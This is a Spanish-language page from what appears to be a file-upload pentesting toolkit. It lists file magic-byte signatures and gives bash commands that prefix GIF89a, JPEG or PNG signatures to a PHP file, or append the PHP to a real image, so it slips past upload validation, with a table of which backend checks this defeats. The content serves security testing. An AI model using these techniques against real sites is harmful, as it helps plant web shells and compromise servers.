# 07 - Magic numbers

## Objetivo

Tener referencias copiables de firmas de archivo para construir payloads manuales o prefijar contenido.

Ruta:

```text
wordlists/content/magic_numbers/
```

Ficheros:

```text
common_magic_numbers.md
gif.txt
jpeg.hex
png.hex
pdf.txt
zip.hex
```

---

## Modelo mental

Algunas validaciones de upload miran varias capas:

```text
filename       → shell.php.jpg
Content-Type   → image/jpeg
magic bytes    → FF D8 FF
contenido real → estructura de imagen válida o prefijo convincente
```

Magic bytes pueden ayudar a pasar validaciones superficiales, pero no convierten automáticamente un payload en un archivo válido.

---

## Tabla rápida

| Formato | Firma textual / hex | Fichero |
|---|---|---|
| GIF87a | `47 49 46 38 37 61` | `gif.txt` |
| GIF89a | `47 49 46 38 39 61` | `gif.txt` |
| JPEG | `FF D8 FF` | `jpeg.hex` |
| PNG | `89 50 4E 47 0D 0A 1A 0A` | `png.hex` |
| PDF | `%PDF-` | `pdf.txt` |
| ZIP | `50 4B 03 04` | `zip.hex` |

---

## Ver firmas disponibles

```bash
cd /opt/fileUpload

cat wordlists/content/magic_numbers/common_magic_numbers.md
cat wordlists/content/magic_numbers/gif.txt
cat wordlists/content/magic_numbers/pdf.txt
```

Para firmas en hex:

```bash
cat wordlists/content/magic_numbers/jpeg.hex
cat wordlists/content/magic_numbers/png.hex
cat wordlists/content/magic_numbers/zip.hex
```

---

# 1. Convertir HEX a bytes

## JPEG

```bash
xxd -r -p wordlists/content/magic_numbers/jpeg.hex > /tmp/jpeg_magic.bin
xxd /tmp/jpeg_magic.bin
```

## PNG

```bash
xxd -r -p wordlists/content/magic_numbers/png.hex > /tmp/png_magic.bin
xxd /tmp/png_magic.bin
```

## ZIP

```bash
xxd -r -p wordlists/content/magic_numbers/zip.hex > /tmp/zip_magic.bin
xxd /tmp/zip_magic.bin
```

---

# 2. Prefijar PHP con GIF89a

GIF es el caso más manual y didáctico:

```bash
{
  printf 'GIF89a\n'
  cat wordlists/content/php/php_funciona.php
} > /tmp/gif89a_php_funciona.gif
```

Comprobar:

```bash
head -3 /tmp/gif89a_php_funciona.gif
```

---

# 3. Prefijar con bytes JPEG

```bash
{
  xxd -r -p wordlists/content/magic_numbers/jpeg.hex
  printf '\n'
  cat wordlists/content/php/php_funciona.php
} > /tmp/jpeg_magic_php_funciona.jpg
```

Comprobar primeros bytes:

```bash
xxd -l 32 /tmp/jpeg_magic_php_funciona.jpg
```

Salida esperada al inicio:

```text
ff d8 ff ...
```

---

# 4. Prefijar con bytes PNG

```bash
{
  xxd -r -p wordlists/content/magic_numbers/png.hex
  printf '\n'
  cat wordlists/content/php/php_funciona.php
} > /tmp/png_magic_php_funciona.png
```

Comprobar:

```bash
xxd -l 32 /tmp/png_magic_php_funciona.png
```

Salida esperada al inicio:

```text
89 50 4e 47 0d 0a 1a 0a
```

---

# 5. Partir de un archivo real

Si la validación usa un parser de imagen, prefijar magic bytes puede no bastar.

Mejor:

```bash
cat real_image.jpg wordlists/content/php/php_funciona.php \
  > /tmp/real_image_plus_php.jpg
```

O para PNG:

```bash
cat real_image.png wordlists/content/php/php_funciona.php \
  > /tmp/real_image_plus_php.png
```

---

## Cuándo puede bastar con magic bytes

| Validación backend | ¿Puede bastar? | Comentario |
|---|---:|---|
| Comprueba primeros bytes | Sí | Validación superficial |
| Comprueba `Content-Type` + primeros bytes | A veces | Depende de la lógica |
| `getimagesize()` | Normalmente no | Requiere estructura válida |
| Reencode/resize | No fiable | Puede destruir payload añadido |
| Antivirus/CDR/sanitizer | No fiable | Puede limpiar o bloquear |

---

## Resumen

```text
Magic bytes = pieza manual para construir contenido.
No sustituyen a una imagen válida si el backend usa un parser real.
```
